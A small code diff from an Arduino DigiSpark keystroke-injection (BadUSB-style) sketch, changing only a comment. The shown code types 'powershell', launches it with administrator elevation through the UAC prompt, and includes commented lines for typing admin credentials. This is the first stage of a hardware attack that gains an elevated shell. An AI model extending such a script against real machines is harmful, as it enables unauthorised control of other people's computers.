@@ -8,8 +8,7 @@ void setup() {
     DigiKeyboard.print("powershell");
     delay(200);
     DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
-    DigiKeyboard.delay(2000); // Wait for UAC prompt to fully load
-
+    DigiKeyboard.delay(2000);
     // If your UAC prompt asks for a Username AND Password, uncomment the next two lines:
     // DigiKeyboard.print("Administrator");
     // DigiKeyboard.sendKeyStroke(43); // 43 is the TAB key
